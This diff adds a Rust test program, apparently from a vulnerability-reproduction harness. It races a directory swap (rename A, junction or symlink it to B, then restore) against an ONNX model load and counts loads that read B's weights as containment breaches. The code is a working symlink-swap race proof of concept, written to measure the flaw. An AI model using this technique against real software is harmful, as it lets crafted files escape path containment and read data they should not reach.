@@ -1,0 +1,214 @@
+//! flip_revert <work_dir> <iterations> [--hold-us N] [--min-cycles N]
+//! base/A/w.bin(正) と base/B/w.bin(別パターン)。攻撃: A->A_orig, A を B への junction(Windows)/symlink(unix),
+//! hold-us 待機, リンク A 自体を削除(リトライ), A_orig->A（リトライ上限付き）。
+//! メイン: from_path ループで A/B/その他を分類（B 一致 = 封じ込め破り）。攻撃は load と独立に回る。
+//! --min-cycles: 攻撃が N 周するまで iterations を超えて継続（上限 iterations*20）。
+use std::collections::BTreeMap;
+use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering::SeqCst};
+use std::sync::Arc;
+use std::time::{Duration, Instant};
+use win2393_harness::*;
+
+type Stage = BTreeMap<String, u64>;
+
+fn bump(m: &mut Stage, key: String) {
+    *m.entry(key).or_default() += 1;
+}
+fn res_key(stage: &str, r: &std::io::Result<()>) -> String {
+    match r {
+        Ok(()) => format!("{stage}:ok"),
+        Err(e) => format!("{stage}:err{}", code_of(e)),
+    }
+}
+
+const RESTORE_TRIES_PER_CYCLE: u32 = 3000;
+const REMOVE_TRIES_PER_CYCLE: u32 = 3000;
+const MAX_FAILED_CYCLES: u32 = 3;
+
+/// A が「w.bin を持たない実ディレクトリ（junction 削除後の残骸）」か。
+fn is_stray_empty_a(a: &Path) -> bool {
+    a.is_dir() && !is_reparse(a) && !a.join("w.bin").exists()
+}
+
+fn main() {
+    let a = args_or_usage(2, "flip_revert <work_dir> <iterations> [--hold-us N] [--min-cycles N]");
+    let base = PathBuf::from(&a[0]).join("base");
+    let iters: u64 = a[1].parse().unwrap_or(0);
+    let opt = |name: &str, dflt: u64| -> u64 {
+        a.iter().position(|x| x == name).and_then(|i| a.get(i + 1)).and_then(|v| v.parse().ok()).unwrap_or(dflt)
+    };
+    let hold_us = opt("--hold-us", 300);
+    let min_cycles = opt("--min-cycles", 0);
+    let (da, db, orig) = (base.join("A"), base.join("B"), base.join("A_orig"));
+    let elems = 64 * 1024u64;
+    // 前回の残骸を掃除してから作り直す
+    if is_reparse(&da) {
+        let _ = remove_dir_link_robust(&da);
+    }
+    if orig.exists() && !da.join("w.bin").exists() {
+        if is_stray_empty_a(&da) {
+            let _ = std::fs::remove_dir(&da);
+        }
+        let _ = std::fs::rename(&orig, &da);
+    }
+    let setup = (|| -> std::io::Result<()> {
+        write_pattern_file(&da.join("w.bin"), elems, SEED_A)?;
+        write_pattern_file(&db.join("w.bin"), elems, SEED_B)?;
+        std::fs::write(base.join("model.onnx"), build_model_bytes("A/w.bin", elems))
+    })();
+    if let Err(e) = setup {
+        rec("setup", &[("result", "err".into()), ("debug", format!("{e:?}"))]);
+        println!("summary status=setup_error");
+        return;
+    }
+    let model = base.join("model.onnx");
+    let stop = Arc::new(AtomicBool::new(false));
+    let aborted = Arc::new(AtomicBool::new(false));
+    let cycles = Arc::new(AtomicU64::new(0));
+    let (s2, ab2, cy2, da2, db2, orig2) =
+        (stop.clone(), aborted.clone(), cycles.clone(), da.clone(), db.clone(), orig.clone());
+    let th = std::thread::spawn(move || {
+        let mut st = Stage::new();
+        let mut attempts = 0u64;
+        let mut failed_cycles = 0u32;
+        while !s2.load(SeqCst) {
+            attempts += 1;
+            // 段 1: A -> A_orig
+            let r1 = std::fs::rename(&da2, &orig2);
+            bump(&mut st, res_key("1_rename_A_to_orig", &r1));
+            if r1.is_err() {
+                std::thread::yield_now();
+                continue;
+            }
+            // 段 2: A を B へのリンクにする
+            let r2 = make_dir_link(&da2, &db2);
+            bump(&mut st, res_key("2_link_A_to_B", &r2));
+            let t = Instant::now();
+            while t.elapsed() < Duration::from_micros(hold_us) {
+                std::hint::spin_loop();
+            }
+            // 段 3: リンク A 自体を削除（ハンドル保持等で失敗したらリトライ。残骸も除去）
+            if r2.is_ok() || da2.exists() {
+                let mut gone = false;
+                for _ in 0..REMOVE_TRIES_PER_CYCLE {
+                    if !is_reparse(&da2) && !da2.exists() {
+                        gone = true;
+                        break;
+                    }
+                    let (first, g) = remove_dir_link_robust(&da2);
+                    if let Some(e) = &first {
+                        bump(&mut st, format!("3_remove_link:err{}", code_of(e)));
+                    }
+                    if g {
+                        if first.is_none() {
+                            bump(&mut st, "3_remove_link:ok".into());
+                        } else {
+                            bump(&mut st, "3_remove_link:ok_via_fsctl_fallback".into());
+                        }
+                        gone = true;
+                        break;
+                    }
+                    std::thread::yield_now();
+                }
+                if !gone {
+                    bump(&mut st, "3_remove_link:GAVE_UP".into());
+                }
+            }
+            // 段 4: A_orig -> A（上限付きリトライ。A に残骸の空ディレクトリがあれば除去）
+            let mut restored = false;
+            for _ in 0..RESTORE_TRIES_PER_CYCLE {
+                match std::fs::rename(&orig2, &da2) {
+                    Ok(()) => {
+                        bump(&mut st, "4_restore:ok".into());
+                        restored = true;
+                        break;
+                    }
+                    Err(e) => {
+                        bump(&mut st, format!("4_restore:err{}", code_of(&e)));
+                        if is_reparse(&da2) {
+                            let (_, g) = remove_dir_link_robust(&da2);
+                            bump(&mut st, format!("4b_remove_leftover_link:{}", if g { "ok" } else { "fail" }));
+                        } else if is_stray_empty_a(&da2) {
+                            let r = std::fs::remove_dir(&da2);
+                            bump(&mut st, res_key("4b_remove_stray_dir", &r));
+                        }
+                        std::thread::yield_now();
+                    }
+                }
+            }
+            if restored {
+                cy2.fetch_add(1, SeqCst);
+            } else {
+                bump(&mut st, "4_restore:GAVE_UP".into());
+                failed_cycles += 1;
+                if failed_cycles >= MAX_FAILED_CYCLES {
+                    ab2.store(true, SeqCst);
+                    break;
+                }
+            }
+        }
+        (st, attempts)
+    });
+    let mut res: BTreeMap<String, u64> = BTreeMap::new();
+    let cap = if min_cycles > 0 { iters.saturating_mul(20) } else { iters };
+    let mut done_iters = 0u64;
+    while done_iters < cap && !aborted.load(SeqCst) {
+        if done_iters >= iters && cycles.load(SeqCst) >= min_cycles {
+            break;
+        }
+        let key = match load_and_verify(&model, &[SEED_A, SEED_B], None) {
+            LoadOutcome::Verdict(Verdict::Match(0)) => "A_correct".to_string(),
+            LoadOutcome::Verdict(Verdict::Match(_)) => "B_value_CONTAINMENT_BREACH".to_string(),
+            LoadOutcome::Verdict(Verdict::Invalid { detail }) => format!("OTHER_INVALID:{detail}"),
+            LoadOutcome::Err(b) => format!("typed_err:{b}"),
+        };
+        *res.entry(key).or_default() += 1;
+        done_iters += 1;
+    }
+    stop.store(true, SeqCst);
+    let (st, attempts) = th.join().unwrap_or((Stage::new(), 0));
+
+    // 終了時の後始末: 必ず A=実ディレクトリ・A_orig なしへ戻す（攻撃スレッド停止後なのでハンドルは無い）
+    let mut cleanup = Vec::new();
+    for round in 0..50 {
+        if is_reparse(&da) {
+            let (_, g) = remove_dir_link_robust(&da);
+            cleanup.push(format!("remove_link:{g}"));
+        }
+        if orig.exists() {
+            if is_stray_empty_a(&da) {
+                cleanup.push(format!("remove_stray:{:?}", std::fs::remove_dir(&da).is_ok()));
+            }
+            if !da.exists() {
+                let r = std::fs::rename(&orig, &da);
+                cleanup.push(match r {
+                    Ok(()) => "restore:ok".to_string(),
+                    Err(e) => format!("restore:err{}", code_of(&e)),
+                });
+            }
+        }
+        if da.join("w.bin").exists() && !orig.exists() && !is_reparse(&da) {
+            break;
+        }
+        std::thread::sleep(Duration::from_millis(20 * (round + 1).min(10)));
+    }
+    let final_ok = da.join("w.bin").exists() && !orig.exists() && !is_reparse(&da) && da.is_dir();
+    for (k, n) in &st {
+        rec("attack_stage", &[("stage", k.clone()), ("count", n.to_string())]);
+    }
+    rec("cleanup", &[("actions", cleanup.join(","))]);
+    let (mut breach, mut other) = (0u64, 0u64);
+    for (k, n) in &res {
+        rec("load_result", &[("result", k.clone()), ("count", n.to_string())]);
+        if k.starts_with("B_value") { breach += n }
+        if k.starts_with("OTHER_INVALID") { other += n }
+    }
+    println!(
+        "summary status=done iterations={done_iters} containment_breach_B={breach} other_invalid={other} attack_cycles={} attack_attempts={attempts} attack_aborted={} hold_us={hold_us} final_state_ok={final_ok} A_exists={} A_orig_exists={}",
+        cycles.load(SeqCst),
+        aborted.load(SeqCst),
+        da.exists(),
+        orig.exists()
+    );
+}
